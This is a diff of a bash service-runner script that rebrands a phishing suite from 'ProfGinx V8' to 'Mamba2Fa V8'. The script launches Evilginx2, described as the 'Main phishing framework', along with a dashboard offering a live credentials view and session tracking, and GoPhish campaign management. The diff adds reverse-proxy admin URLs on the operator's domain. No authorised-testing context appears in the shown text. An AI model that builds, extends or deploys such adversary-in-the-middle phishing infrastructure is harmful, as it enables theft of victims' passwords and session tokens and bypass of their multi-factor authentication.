@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# ProfGinx V8 - Service Runner Script
+# Mamba2Fa V8 - Service Runner Script
 # Starts Evilginx2, EvilFeed Dashboard, and GoPhish services
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -15,7 +15,7 @@ CYAN='\033[0;36m'
 NC='\033[0m'
 
 # tmux session name
-TMUX_SESSION="profginx"
+TMUX_SESSION="mamba2fa"
 
 # Reverse proxy settings
 REVERSE_PROXY=""
@@ -24,7 +24,7 @@ REVERSE_PROXY_DOMAIN=""
 clear
 
 echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║                    PROFGINX V8 SUITE                         ║${NC}"
+echo -e "${CYAN}║                    MAMBA2FA V8 SUITE                         ║${NC}"
 echo -e "${CYAN}║     Evilginx2 + EvilFeed Dashboard + GoPhish Integration     ║${NC}"
 echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
 echo ""
@@ -67,18 +67,20 @@ check_tmux() {
 
 show_info() {
     echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
-    echo -e "${CYAN}📋 ProfGinx V8 Suite Components:${NC}"
+    echo -e "${CYAN}📋 Mamba2Fa V8 Suite Components:${NC}"
     echo ""
     echo -e "${GREEN}1. Evilginx2${NC} - Main phishing framework"
     echo "   • Ports: 80, 443 (requires root)"
     echo "   • Config: ./.evilginx/"
     echo ""
     echo -e "${GREEN}2. EvilFeed Dashboard${NC} - Real-time event monitoring"
-    echo "   • URL: http://<server_ip>:1337"
+    echo "   • URL: https://<your-domain>/admin/"
+    echo "   • Fallback: http://<server_ip>:1337 (direct access)"
     echo "   • Features: Live map, credentials view, session tracking"
     echo ""
     echo -e "${GREEN}3. GoPhish${NC} - Campaign management (optional)"
-    echo "   • Admin: https://<server_ip>:3333"
+    echo "   • Admin: https://<your-domain>/mail/"
+    echo "   • Fallback: https://<server_ip>:3333 (direct access)"
     echo "   • Phish Server: 127.0.0.1:8080"
     echo ""
     echo -e "${GREEN}4. PhishCreator${NC} - Phishlet analyzer & fixer"
@@ -957,7 +959,7 @@ run_all() {
         esac
     done
 
-    echo -e "${GREEN}🚀 Starting all ProfGinx V8 services in tmux...${NC}"
+    echo -e "${GREEN}🚀 Starting all Mamba2Fa V8 services in tmux...${NC}"
     if [[ -n "$USE_REVERSE_PROXY" ]]; then
         echo -e "${CYAN}   Reverse Proxy: $USE_REVERSE_PROXY (domain: $REVERSE_DOMAIN)${NC}"
     fi
@@ -1439,7 +1441,7 @@ show_status() {
 }
 
 stop_services() {
-    echo -e "${BLUE}Stopping all ProfGinx V8 services...${NC}"
+    echo -e "${BLUE}Stopping all Mamba2Fa V8 services...${NC}"
     echo ""
 
     # Kill tmux session
